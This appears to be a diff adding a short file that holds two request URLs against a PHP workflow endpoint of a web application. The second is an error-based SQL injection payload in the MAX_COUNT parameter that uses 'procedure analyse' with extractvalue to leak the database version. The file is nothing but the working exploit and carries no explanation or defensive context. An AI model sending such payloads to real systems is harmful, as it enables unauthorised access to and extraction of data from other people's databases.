@@ -1,0 +1,5 @@
+payload1：
+/general/mytable/intel_view/workflow.php?MAX_COUNT=15&TYPE=3&MODULE_SCROLL=false&MODULE_ID=55&MODULE_ID=Math.random
+
+payload2：
+/general/mytable/intel_view/workflow.php?MAX_COUNT=15%20procedure%20analyse(extractvalue(rand(),concat(0x3a,version())),1)&TYPE=3&MODULE_SCROLL=false&MODULE_ID=55&MODULE_ID=Math.random
